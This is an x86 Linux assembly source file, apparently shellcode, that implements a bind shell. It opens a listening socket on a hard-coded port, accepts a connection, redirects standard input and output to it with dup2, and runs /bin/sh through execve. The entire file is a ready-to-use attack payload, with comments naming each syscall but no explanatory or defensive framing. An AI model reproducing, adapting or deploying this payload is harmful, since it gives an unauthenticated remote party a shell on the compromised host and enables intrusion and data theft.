BITS 32
section .text
global _start

_start:
    xor eax,eax
    xor ebx,ebx
    xor edx,edx

    ; server = socket(2,1,0)
    push eax
    push BYTE 0x1
    push BYTE 0x2
    mov ecx,esp
    inc bl
    mov BYTE al,0x66
    int 0x80
    mov esi,eax

    ;bind(server,(struct sockaddr*)&serv_addr,0x10)
    push edx
    push LONG 0xbbbb02bb
    mov ecx,esp
    push BYTE 0x10
    push ecx
    push esi
    mov ecx,esp
    inc bl
    mov BYTE al,0x66
    int 0x80

    ;listen(server, 0)
    push edx
    push esi
    mov ecx,esp
    mov bl, 0x4
    mov BYTE al,0x66
    int 0x80

    ;client=accept(server,0,0)
    push edx
    push edx
    push esi
    mov ecx,esp
    inc bl
    mov BYTE al,0x66
    int 0x80

    ; prepare for dup2 commands
    mov ebx,eax

    ;dup2(client,0)
    xor ecx,ecx
    mov BYTE al,63
    int 0x80

    ;dup2(client,1)
    inc ecx
    mov BYTE al,63
    int 0x80

    ;dup2(client,2)
    inc ecx
    mov BYTE al,63
    int 0x80

    ;standard execve("/bin/sh",0,null)
    push edx
    push long 0x68732f2f
    push long 0x6e69622f
    mov ebx,esp
    push edx
    push ebx
    mov ecx,esp
    mov BYTE al,0x0b
    int 0x80

